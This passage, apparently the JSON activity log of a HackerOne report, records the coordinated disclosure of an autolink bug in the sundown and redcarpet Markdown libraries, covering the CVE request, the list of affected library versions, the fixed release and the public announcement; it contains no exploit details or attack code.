report).","automated_response":false,"created_at":"2015-04-06T17:36:51.911Z","updated_at":"2015-04-06T17:36:51.911Z","actor":{"username":"danlec","cleared":false,"url":"/danlec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":373386,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I mentioned this to @robin850 in e-mail, but we should get a CVE assigned for this issue to make sure others are aware of the issue.\n\nProcess is documented at https://github.com/RedHatProductSecurity/CVE-HOWTO -- specifically by e-mailing both cve-assign@ and oss-security@ with the required information.\n\nDon't care who does it, but somebody should do it as soon as the new redcarpet gem version is released. I'm happy to do it if it's easier for folks...","automated_response":false,"created_at":"2015-04-06T17:39:19.095Z","updated_at":"2015-04-06T17:39:19.095Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":373450,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@reed It's cool if you do the CVE request.  From what I can tell, the issue affects\n\nhttps://github.com/vmg/sundown 1.16.0 (last version before the library was deprecated)\nhttps://github.com/vmg/redcarpet 3.2.2\nhttps://github.com/hoedown/hoedown 3.0.1\n\nIt also affects other (less popular) libraries based off of sundown, including\n\nhttps://github.com/benmills/robotskirt 2.7.1\nhttps://github.com/FSX/misaka 1.0.2\nhttps://github.com/chobie/php-sundown 0.3.11\n\nUsers of these libraries may be vulnerable if the `autolink` extension is enabled.","automated_response":false,"created_at":"2015-04-06T18:15:24.919Z","updated_at":"2015-04-06T18:15:24.919Z","actor":{"username":"danlec","cleared":false,"url":"/danlec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":373531,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\u003e For the record, I notified the maintainers of Hoedown and the GitHub security team and pointed them at the changeset\n\nAwesome, I was about to do it!\n\n@reed : Yes please, if you can, do request a CVE identifier ! You seem more aware about the process than me. :p\n\nIt'd be nice to notice the projects you mentioned @danlec as well once we have the CVE id ; I can handle that if you want.\n\nYou guys rock, thank you! \\m/","automated_response":false,"created_at":"2015-04-06T19:33:30.830Z","updated_at":"2015-04-06T19:33:30.830Z","actor":{"username":"robin850","cleared":false,"url":"/robin850","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/158/f68958f599d6303854a39d92e3786d097f4a024e_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":373602,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@robin850, I want to wait on the redcarpet release before requesting it (so that people have an immediate upgrade path). Do you know when 3.2.3 will be released?","automated_response":false,"created_at":"2015-04-06T21:02:28.638Z","updated_at":"2015-04-06T21:02:28.638Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":374410,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@reed @robin850 If looks like a fixed version of redcarpet is available at https://rubygems.org/gems/redcarpet/versions/3.2.3\n\nI just did a `gem install redcarpet` and the bug no longer reprosâ€¦ so at this point we should be good to get the CVE?\n\nI have a [blog post](http://danlec.com/blog/bug-in-sundown-and-redcarpet) ready for when the issue is disclosed.","automated_response":false,"created_at":"2015-04-07T17:18:55.845Z","updated_at":"2015-04-07T17:32:37.143Z","actor":{"username":"danlec","cleared":false,"url":"/danlec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":374533,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Looks like 3.2.3 has been announced as containing an important security fix.","automated_response":false,"created_at":"2015-04-07T20:04:09.101Z","updated_at":"2015-04-07T20:04:09.101Z","actor":{"username":"danlec","cleared":false,"url":"/danlec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":374534,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@danlec, can you request public disclosure now so when I submit the public notice out to oss-security@ in about an hour or so, I can immediately disclose this report?","automated_response":false,"created_at":"2015-04-07T20:06:11.680Z","updated_at":"2015-04-07T20:06:11.680Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":374535,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"For those who are interested, I wrote out the process of finding, reporting and fixing this bug at http://danlec.com/blog/bug-in-sundown-and-redcarpet","automated_response":false,"created_at":"2015-04-07T20:07:18.267Z","updated_at":"2015-04-07T20:16:16.900Z","first_to_agree":true,"actor":{"username":"danlec","cleared":false,"url":"/danlec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":374598,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Announced to oss-security@ (http://seclists.org/oss-sec/2015/q2/69).","automated_response":false,"created_at":"2015-04-07T21:12:32.495Z","updated_at":"2015-04-07T21:19:37.237Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":374599,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2015-04-07T21:12:33.600Z","updated_at":"2015-04-07T21:12:33.600Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":377704,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Also added to [ruby-advisory-db](https://github.com/rubysec/ruby-advisory-db/pull/144)","automated_response":false,"created_at":"2015-04-11T00:06:21.150Z","updated_at":"2015-04-11T00:06:21.150Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1248050,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2016-10-14T18:16:01.603Z","updated_at":"2016-10-14T18:16:01.603Z","additional_data":{"old_severity":null,"new_severity":"High","old_severity_id":null,"new_severity_id":2199},"actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}